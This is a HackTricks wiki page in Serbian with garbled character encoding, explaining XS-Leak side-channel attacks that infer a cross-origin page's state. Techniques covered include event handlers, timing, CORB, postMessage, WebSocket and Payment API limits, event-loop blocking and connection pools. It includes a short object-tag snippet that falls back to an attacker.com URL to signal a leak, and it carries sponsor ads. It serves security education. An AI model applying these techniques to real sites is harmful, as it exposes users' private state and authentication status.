# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

XS-Search je metoda koriÅ¡Ä‡ena za **izvlaÄenje informacija preko granica porekla** iskoriÅ¡Ä‡avanjem **ranjivosti boÄnog kanala**.

KljuÄni komponenti ukljuÄeni u ovaj napad su:

* **Ranjiva Veb Stranica**: Ciljna veb stranica sa koje se namerava izvuÄ‡i informacija.
* **Veb NapadaÄa**: Zlonamerna veb stranica kreirana od strane napadaÄa, koju Å¾rtva poseÄ‡uje, na kojoj se nalazi eksploatacija.
* **Metod UkljuÄivanja**: Tehnika koja se koristi za ukljuÄivanje Ranjive Veb Stranice u Veb NapadaÄa (npr. window.open, iframe, fetch, HTML oznaka sa href itd.).
* **Tehnika Curenja**: Tehnike koriÅ¡Ä‡ene za razlikovanje stanja Ranjive Veb Stranice na osnovu informacija prikupljenih putem metoda ukljuÄivanja.
* **Stanja**: Dva potencijalna stanja Ranjive Veb Stranice, koja napadaÄ pokuÅ¡ava razlikovati.
* **Detektovive Razlike**: Opservabilne varijacije na koje se napadaÄ oslanja kako bi zakljuÄio stanje Ranjive Veb Stranice.

### Detektovive Razlike

Neke aspekte moÅ¾emo analizirati kako bismo razlikovali stanja Ranjive Veb Stranice:

* **Statusni Kod**: Razlikovanje izmeÄ‘u **razliÄitih HTTP odgovora statusnih kodova** preko granica porekla, kao Å¡to su serverske greÅ¡ke, klijentske greÅ¡ke ili autentikacione greÅ¡ke.
* **KoriÅ¡Ä‡enje API-ja**: Identifikacija **koriÅ¡Ä‡enja Web API-ja** preko stranica, otkrivajuÄ‡i da li odreÄ‘ena JavaScript Web API koristi stranica preko granica porekla.
* **Preusmeravanja**: Detektovanje navigacija ka razliÄitim stranicama, ne samo HTTP preusmeravanja veÄ‡ i onih pokrenutih JavaScript-om ili HTML-om.
* **SadrÅ¾aj Stranice**: Posmatranje **varijacija u telu HTTP odgovora** ili u pod-resursima stranice, kao Å¡to su **broj ugraÄ‘enih okvira** ili veliÄinske razlike u slikama.
* **HTTP Zaglavlje**: PrimeÄ‡ivanje prisustva ili moÅ¾da vrednosti **specifiÄnog HTTP odgovora zaglavlja**, ukljuÄujuÄ‡i zaglavlja poput X-Frame-Options, Content-Disposition i Cross-Origin-Resource-Policy.
* **Vreme**: PrimeÄ‡ivanje konzistentnih vremenskih razlika izmeÄ‘u dva stanja.

### Metodi UkljuÄivanja

* **HTML Elementi**: HTML nudi razliÄite elemente za **ukljuÄivanje resursa preko granica porekla**, poput stilova, slika ili skripti, prisiljavajuÄ‡i pregledaÄ da zatraÅ¾i ne-HTML resurs. Kompilacija potencijalnih HTML elemenata za ovu svrhu moÅ¾e se pronaÄ‡i na [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Okviri**: Elementi poput **iframe**, **object** i **embed** mogu ugraditi HTML resurse direktno na stranicu napadaÄa. Ako stranica **nema zaÅ¡titu okvira**, JavaScript moÅ¾e pristupiti window objektu ugraÄ‘enog resursa putem contentWindow svojstva.
* **IskaÄuÄ‡i Prozori**: Metoda **`window.open`** otvara resurs u novom tabu ili prozoru, pruÅ¾ajuÄ‡i **ruÄku prozora** za JavaScript da interaguje sa metodama i svojstvima prateÄ‡i SOP. IskaÄuÄ‡i prozori, Äesto koriÅ¡Ä‡eni u jednokratnoj prijavi, zaobilaze ograniÄenja okvira i kolaÄiÄ‡a ciljnog resursa. MeÄ‘utim, moderni pregledaÄi ograniÄavaju kreiranje iskaÄuÄ‡ih prozora na odreÄ‘ene korisniÄke akcije.
* **JavaScript Zahtevi**: JavaScript dozvoljava direktno zahteve ka ciljnim resursima koriÅ¡Ä‡enjem **XMLHttpRequests** ili **Fetch API-ja**. Ove metode nude preciznu kontrolu nad zahtevom, kao Å¡to je opcija praÄ‡enja HTTP preusmeravanja.

### Tehnike Curenja

* **Rukovalac DogaÄ‘ajima**: Klasika tehnika curenja u XS-Leaks, gde rukovaoci dogaÄ‘ajima poput **onload** i **onerror** pruÅ¾aju uvide o uspehu ili neuspehu uÄitavanja resursa.
* **Poruke o GreÅ¡kama**: JavaScript izuzeci ili posebne stranice greÅ¡aka mogu pruÅ¾iti informacije o curenju ili razlikovanju izmeÄ‘u prisustva i odsustva greÅ¡ke.
* **Globalna OgraniÄenja**: FiziÄka ograniÄenja pregledaÄa, poput kapaciteta memorije ili drugih nametnutih ograniÄenja pregledaÄa, mogu signalizirati kada je dostignut prag, sluÅ¾eÄ‡i kao tehnika curenja.
* **Globalno Stanje**: Detektovive interakcije sa **globalnim stanjima pregledaÄa** (npr. interfejs Istorije) mogu biti iskoriÅ¡Ä‡ene. Na primer, **broj unosa** u istoriji pregledaÄa moÅ¾e pruÅ¾iti tragove o stranicama preko granica porekla.
* **Performance API**: Ovaj API pruÅ¾a **detalje o performansama trenutne stranice**, ukljuÄujuÄ‡i mreÅ¾no vreme za dokument i uÄitane resurse, omoguÄ‡avajuÄ‡i zakljuÄke o traÅ¾enim resursima.
* **ÄŒitljivi Atributi**: Neki HTML atributi su **Äitljivi preko granica porekla** i mogu se koristiti kao tehnika curenja. Na primer, svojstvo `window.frame.length` omoguÄ‡ava JavaScript-u da prebroji okvire ukljuÄene na stranici preko granica porekla.

## XSinator Alat & Rad

XSinator je automatski alat za **proveru pregledaÄa protiv nekoliko poznatih XS-Leaks** objaÅ¡njenih u njegovom radu: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

MoÅ¾ete **pristupiti alatu na** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**IskljuÄeni XS-Leakovi**: Morali smo iskljuÄiti XS-Leakove koji se oslanjaju na **servisne radnike** jer bi ometali druge curenja u XSinatoru. TakoÄ‘e, odluÄili smo **iskljuÄiti XS-Leakove koji se oslanjaju na loÅ¡e konfiguracije i greÅ¡ke u odreÄ‘enoj veb aplikaciji**. Na primer, CORS loÅ¡e konfiguracije, postMessage curenja ili Cross-Site Scripting. Dodatno, iskljuÄili smo XS-Leakove zasnovane na vremenu jer Äesto pate od sporosti, buke i netaÄnosti.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
## **Tehnike zasnovane na vremenu**

Neke od sledeÄ‡ih tehnika koristiÄ‡e vreme kao deo procesa za otkrivanje razlika u moguÄ‡im stanjima web stranica. Postoje razliÄiti naÄini merenja vremena u web pregledaÄu.

**Satovi**: API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) omoguÄ‡ava programerima da dobiju merenja visoke rezolucije vremena.\
Postoji znaÄajan broj API-ja koje napadaÄi mogu zloupotrebiti kako bi kreirali implicitne satove: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animacije i drugi.\
Za viÅ¡e informacija: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Tehnike rukovaoca dogaÄ‘ajima

### Onload/Onerror

* **Metodi ukljuÄivanja**: Okviri, HTML elementi
* **Detektovana razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Rezime**: ako se pokuÅ¡a uÄitavanje resursa i dogaÄ‘aji onerror/onload se aktiviraju kada se resurs uspeÅ¡no/neuspeÅ¡no uÄita, moguÄ‡e je saznati statusni kod.
* **Primer koda**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Primer koda pokuÅ¡ava da **uÄita objekte skriptova iz JS-a**, ali se **drugi tagovi** poput objekata, stilova, slika, zvukova takoÄ‘e mogu koristiti. Osim toga, moguÄ‡e je direktno ubaciti **tag** i deklarisati dogaÄ‘aje `onload` i `onerror` unutar taga (umesto da se ubacuje iz JS-a).

Postoji i verzija ovog napada bez skripti:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
U ovom sluÄaju, ako se `example.com/404` ne pronaÄ‘e, uÄitaÄ‡e se `attacker.com/?error`.

### Vreme uÄitavanja

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: Vreme (obiÄno zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Rezime:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** se moÅ¾e koristiti za merenje vremena potrebnog za izvrÅ¡avanje zahteva. MeÄ‘utim, mogu se koristiti i drugi Äasovnici, poput [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) koji moÅ¾e identifikovati zadatke koji se izvrÅ¡avaju duÅ¾e od 50ms.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) joÅ¡ jedan primer u:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Vreme uÄitavanja + Prisilni teÅ¾ak zadatak

Ova tehnika je sliÄna prethodnoj, ali Ä‡e **napadaÄ** takoÄ‘e **prisiliti** neku akciju da traje **relevantno dugo vreme** kada je **odgovor pozitivan ili negativan** i meriti to vreme.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Vreme istovarivanja/pre istovarivanja

* **Metode ukljuÄivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (obiÄno zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Rezime:** [SharedArrayBuffer Äasovnik](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se moÅ¾e koristiti za merenje vremena potrebnog za izvrÅ¡avanje zahteva. Mogu se koristiti i drugi Äasovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Vreme potrebno za preuzimanje resursa moÅ¾e se meriti koriÅ¡Ä‡enjem dogaÄ‘aja [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) i [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). DogaÄ‘aj **`beforeunload`** se pokreÄ‡e kada se pretraÅ¾ivaÄ sprema da preÄ‘e na novu stranicu, dok se dogaÄ‘aj **`unload`** deÅ¡ava kada se navigacija zapravo odvija. Razlika u vremenu izmeÄ‘u ova dva dogaÄ‘aja moÅ¾e se izraÄunati kako bi se odredilo **koliko je vremena pretraÅ¾ivaÄ proveo preuzimajuÄ‡i resurs**.

### Vreme frejma sa peskom + uÄitavanje <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Metode ukljuÄivanja**: Frejmovi
* **Detektoviva razlika**: Vreme (obiÄno zbog sadrÅ¾aja stranice, statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Rezime:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API se moÅ¾e koristiti za merenje vremena potrebnog za izvrÅ¡avanje zahteva. Mogu se koristiti i drugi Äasovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

PrimeÄ‡eno je da u odsustvu [ZaÅ¡titnih okvira](https://xsleaks.dev/docs/defenses/opt-in/xfo/), vreme potrebno za uÄitavanje stranice i njenih podresursa preko mreÅ¾e moÅ¾e biti izmereno od strane napadaÄa. Ovo merenje je obiÄno moguÄ‡e jer se `onload` rukovalac frejma pokreÄ‡e tek nakon zavrÅ¡etka uÄitavanja resursa i izvrÅ¡avanja JavaScript-a. Da bi zaobiÅ¡li varijabilnost koju uvodi izvrÅ¡avanje skripti, napadaÄ moÅ¾e koristiti atribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) unutar `<iframe>`. UkljuÄivanje ovog atributa ograniÄava brojne funkcionalnosti, posebno izvrÅ¡avanje JavaScript-a, Äime se olakÅ¡ava merenje koje je preteÅ¾no uticano performansama mreÅ¾e.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + greÅ¡ka + onload

* **Metode ukljuÄivanja**: Okviri
* **Detektovana razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**:
* **SaÅ¾etak**: Ako moÅ¾ete da izazovete greÅ¡ku na stranici kada se pristupi ispravnom sadrÅ¾aju i da je pravilno uÄitate kada se pristupi bilo kom sadrÅ¾aju, tada moÅ¾ete napraviti petlju za izvlaÄenje svih informacija bez merenja vremena.
* **Primer koda**:

Pretpostavimo da moÅ¾ete **ubaciti** **stranicu** koja ima **tajni** sadrÅ¾aj **unutar Iframe-a**.

MoÅ¾ete **naterati Å¾rtvu da traÅ¾i** datoteku koja sadrÅ¾i "_**flag**_" koristeÄ‡i **Iframe** (na primer, iskoriÅ¡Ä‡avajuÄ‡i CSRF). Unutar Iframe-a znate da Ä‡e se _**onload dogaÄ‘aj**_ uvek **izvrÅ¡iti barem jednom**. Zatim moÅ¾ete **promeniti** **URL** Iframe-a, ali menjajuÄ‡i samo **sadrÅ¾aj** **heÅ¡a** unutar URL-a.

Na primer:

1. **URL1**: www.napadac.com/xssearch#probaj1
2. **URL2**: www.napadac.com/xssearch#probaj2

Ako je prvi URL **uspeÅ¡no uÄitan**, tada, kada se **promeni** **deo heÅ¡a** URL-a, **onload** dogaÄ‘aj **neÄ‡e biti ponovo pokrenut**. Ali **ako** je stranica imala neku vrstu **greÅ¡ke** prilikom **uÄitavanja**, tada Ä‡e se **onload** dogaÄ‘aj ponovo **pokrenuti**.

Tako moÅ¾ete **razlikovati** izmeÄ‘u stranice koja je **ispravno** uÄitana i stranice koja ima **greÅ¡ku** prilikom pristupa.

### IzvrÅ¡enje Javascript-a

* **Metode ukljuÄivanja**: Okviri
* **Detektovana razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**:
* **SaÅ¾etak**: Ako **stranica** vraÄ‡a **osetljiv** sadrÅ¾aj, **ili** sadrÅ¾aj koji moÅ¾e biti **kontrolisan** od strane korisnika. Korisnik moÅ¾e postaviti **validan JS kod u negativnom sluÄaju**, i **uÄitati** svaki pokuÅ¡aj unutar **`<script>`** oznaka, tako da se u **negativnim** sluÄajevima izvrÅ¡ava napadaÄki **kod**, a u **afirmativnim** sluÄajevima **niÅ¡ta** neÄ‡e biti izvrÅ¡eno.
* **Primer koda**:

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Metode ukljuÄivanja**: HTML elementi
* **Detektovana razlika**: Statusni kod i zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **SaÅ¾etak**: **Cross-Origin Read Blocking (CORB)** je sigurnosna mera koja spreÄava uÄitavanje odreÄ‘enih osetljivih resursa sa razliÄitih izvora kako bi se zaÅ¡titili od napada poput **Spectre**. MeÄ‘utim, napadaÄi mogu iskoristiti njegovo zaÅ¡titno ponaÅ¡anje. Kada odgovor podloÅ¾an **CORB**-u vrati _**CORB zaÅ¡tiÄ‡eni**_ `Content-Type` sa `nosniff` i `2xx` statusnim kodom, **CORB** uklanja telo i zaglavlja odgovora. NapadaÄi koji to posmatraju mogu zakljuÄiti kombinaciju **statusnog koda** (ukazujuÄ‡i na uspeh ili greÅ¡ku) i `Content-Type` (oznaÄavajuÄ‡i da li je zaÅ¡tiÄ‡en od strane **CORB**-a), Å¡to moÅ¾e dovesti do potencijalnog otkrivanja informacija.
* **Primer koda**:

Proverite link za viÅ¡e informacija o napadu.

### onblur

* **Metode ukljuÄivanja**: Okviri
* **Detektovana razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **SaÅ¾etak**: Procure osetljivi podaci iz id ili name atributa.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

MoguÄ‡e je **uÄitati stranicu** unutar **iframe-a** i koristiti **`#vrednost_id`** da bi se stranica **fokusirala na element** iframe-a sa naznaÄenim id-om, zatim ako je signal **`onblur`** pokrenut, ID element postoji.\
MoÅ¾ete izvesti isti napad sa **`portal`** oznakama.

### postMessage Emitovanja <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektovana razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **SaÅ¾etak**: Prikupljanje osetljivih informacija putem postMessage ili koriÅ¡Ä‡enje prisustva postMessages kao orakla da bi se znalo stanje korisnika na stranici
* **Primer koda**: `Bilo koji kod koji osluÅ¡kuje sve postMessages.`

Aplikacije Äesto koriste [`postMessage` emitovanja](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) za komunikaciju izmeÄ‘u razliÄitih izvora. MeÄ‘utim, ovaj metod moÅ¾e nenamerno otkriti **osetljive informacije** ako parametar `targetOrigin` nije pravilno specificiran, omoguÄ‡avajuÄ‡i bilo kojem prozoru da primi poruke. Osim toga, samo primanje poruke moÅ¾e delovati kao **orakl**; na primer, odreÄ‘ene poruke mogu biti poslate samo korisnicima koji su prijavljeni. Stoga, prisustvo ili odsustvo ovih poruka moÅ¾e otkriti informacije o stanju ili identitetu korisnika, kao Å¡to je da li su autentifikovani ili ne.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) da lako izgradite i **automatizujete tokove rada** pomoÄ‡u najnaprednijih alata zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Globalne Tehnike OgraniÄenja

### WebSocket API

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektovana razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **SaÅ¾etak**: Iscrpljivanje limita WebSocket veze otkriva broj WebSocket veza stranice sa razliÄitog izvora.
* **Primer koda**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

MoguÄ‡e je identifikovati da li, i koliko, **WebSocket veza ciljna stranica koristi**. To omoguÄ‡ava napadaÄu da otkrije stanja aplikacije i procure informacije vezane za broj WebSocket veza.

Ako jedan **izvor** koristi **maksimalan broj WebSocket** objekata veze, bez obzira na njihovo stanje veze, kreiranje **novih objekata rezultiraÄ‡e JavaScript izuzecima**. Da bi izveo ovaj napad, napadaÄka veb lokacija otvara ciljnu veb lokaciju u iskaÄuÄ‡em prozoru ili iframe-u, a zatim, nakon Å¡to je ciljna veb lokacija uÄitana, pokuÅ¡ava da kreira maksimalan broj moguÄ‡ih WebSocket veza. **Broj baÄenih izuzetaka** je **broj WebSocket veza koje koristi ciljna veb lokacija** prozora.
### Payment API

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektibilna razlika**: KoriÅ¡Ä‡enje API-ja
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **SaÅ¾etak**: Otkrij zahtev za plaÄ‡anje jer moÅ¾e biti aktivan samo jedan u isto vreme.
* **Primer koda**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Ovaj XS-Leak omoguÄ‡ava napadaÄu da **otkrije kada prekograniÄna stranica pokrene zahtev za plaÄ‡anje**.

Zato Å¡to **moÅ¾e biti aktivan samo jedan zahtev za plaÄ‡anje** u isto vreme, ako ciljana veb lokacija koristi Payment Request API, bilo kakvi **dalji pokuÅ¡aji koriÅ¡Ä‡enja ovog API-ja Ä‡e propasti**, i izazvati **JavaScript izuzetak**. NapadaÄ moÅ¾e iskoristiti ovo tako Å¡to Ä‡e **periodiÄno pokuÅ¡avati da prikaÅ¾e Payment API UI**. Ako jedan pokuÅ¡aj izazove izuzetak, ciljana veb lokacija trenutno ga koristi. NapadaÄ moÅ¾e sakriti ove periodiÄne pokuÅ¡aje tako Å¡to Ä‡e odmah zatvoriti UI nakon kreiranja.

### Merenje petlje dogaÄ‘aja <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Metode ukljuÄivanja**:
* **Detektibilna razlika**: Vreme (uglavnom zbog SadrÅ¾aja Stranice, Statusnog Koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **SaÅ¾etak**: Merenje vremena izvrÅ¡avanja veba zloupotrebom jednonitne JS petlje dogaÄ‘aja.
* **Primer koda**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript funkcioniÅ¡e na [jednonitnoj petlji dogaÄ‘aja](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) modelu konkurentnosti, Å¡to znaÄi da **moÅ¾e izvrÅ¡avati samo jedan zadatak u isto vreme**. Ova karakteristika moÅ¾e biti iskoriÅ¡Ä‡ena da se utvrdi **koliko vremena je potrebno da se kod sa razliÄitog porekla izvrÅ¡i**. NapadaÄ moÅ¾e meriti vreme izvrÅ¡avanja svog koda u petlji dogaÄ‘aja kontinuiranim slanjem dogaÄ‘aja sa fiksnim svojstvima. Ti dogaÄ‘aji Ä‡e biti obraÄ‘eni kada je bazen dogaÄ‘aja prazan. Ako i druga porekla takoÄ‘e Å¡alju dogaÄ‘aje u isti bazen, **napadaÄ moÅ¾e zakljuÄiti vreme potrebno za izvrÅ¡avanje tih spoljnih dogaÄ‘aja posmatrajuÄ‡i kaÅ¡njenja u izvrÅ¡avanju svojih zadataka**. Ovaj metod praÄ‡enja petlje dogaÄ‘aja za kaÅ¡njenja moÅ¾e otkriti vreme izvrÅ¡avanja koda sa razliÄitih porekla, potencijalno otkrivajuÄ‡i osetljive informacije.

{% hint style="warning" %}
Prilikom merenja vremena izvrÅ¡avanja moguÄ‡e je **eliminisati** **mreÅ¾ne faktore** kako bi se dobile **preciznije merenja**. Na primer, uÄitavanjem resursa koriÅ¡Ä‡enih od strane stranice pre njenog uÄitavanja.
{% endhint %}

### Zauzeta petlja dogaÄ‘aja <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Metode ukljuÄivanja**:
* **Detektibilna razlika**: Vreme (uglavnom zbog SadrÅ¾aja Stranice, Statusnog Koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **SaÅ¾etak**: Jedan metod za merenje vremena izvrÅ¡avanja veb operacije ukljuÄuje namerno blokiranje petlje dogaÄ‘aja niti, a zatim merenje **koliko vremena je potrebno da petlja dogaÄ‘aja ponovo postane dostupna**. Ubacivanjem blokirajuÄ‡e operacije (kao Å¡to je dugotrajno raÄunanje ili sinhroni API poziv) u petlju dogaÄ‘aja, i praÄ‡enjem vremena potrebnog za poÄetak izvrÅ¡avanja sledeÄ‡eg koda, moÅ¾e se zakljuÄiti trajanje zadataka koji su se izvrÅ¡avali u petlji dogaÄ‘aja tokom blokiranog perioda. Ova tehnika koristi jednonitnu prirodu JavaScript-ove petlje dogaÄ‘aja, gde se zadaci izvrÅ¡avaju sekvencijalno, i moÅ¾e pruÅ¾iti uvid u performanse ili ponaÅ¡anje drugih operacija koje dele istu nit.

* **Primer koda**:

ZnaÄajna prednost tehnike merenja vremena izvrÅ¡avanja zakljuÄavanjem petlje dogaÄ‘aja je njena sposobnost da zaobiÄ‘e **Izolaciju sajta**. **Izolacija sajta** je bezbednosna funkcija koja razdvaja razliÄite veb lokacije u odvojene procese, sa ciljem da spreÄi zlonamerne sajtove da direktno pristupe osetljivim podacima sa drugih sajtova. MeÄ‘utim, uticajem na vreme izvrÅ¡avanja druge lokacije kroz deljenu petlju dogaÄ‘aja, napadaÄ moÅ¾e indirektno izvuÄ‡i informacije o aktivnostima te lokacije. Ova metoda ne oslanja se na direktni pristup podacima druge lokacije, veÄ‡ posmatra uticaj aktivnosti te lokacije na deljenu petlju dogaÄ‘aja, Äime izbegava zaÅ¡titne barijere uspostavljene od strane **Izolacije sajta**.

{% hint style="warning" %}
Prilikom merenja vremena izvrÅ¡avanja moguÄ‡e je **eliminisati** **mreÅ¾ne faktore** kako bi se dobile **preciznije merenja**. Na primer, uÄitavanjem resursa koriÅ¡Ä‡enih od strane stranice pre njenog uÄitavanja.
{% endhint %}

### Pool konekcija

* **Metode ukljuÄivanja**: JavaScript Zahtevi
* **Detektibilna razlika**: Vreme (uglavnom zbog SadrÅ¾aja Stranice, Statusnog Koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **SaÅ¾etak**: NapadaÄ bi mogao da blokira sve prikljuÄke osim 1, uÄita ciljnu veb stranicu i istovremeno uÄita drugu stranicu, vreme dok poslednja stranica poÄne da se uÄitava je vreme koje je ciljna stranica uzela da se uÄita.
* **Primer koda**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

